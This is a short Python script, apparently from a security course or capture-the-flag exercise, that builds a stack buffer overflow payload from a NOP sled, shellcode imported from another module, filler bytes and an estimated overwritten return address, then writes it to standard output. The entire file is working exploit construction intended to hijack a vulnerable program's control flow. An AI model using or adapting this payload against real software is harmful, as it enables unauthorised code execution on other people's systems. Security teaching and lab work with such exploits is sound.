#!/usr/bin/env python3

import sys

from shellcode import shellcode

noop_sled = b'\x90'* 970
filler = b'A' * 124 

hacking = noop_sled + shellcode + filler

#estimated beginning address
return_addr = 0x7ffffff68c00.to_bytes(8, 'little')
sys.stdout.buffer.write(hacking + return_addr)
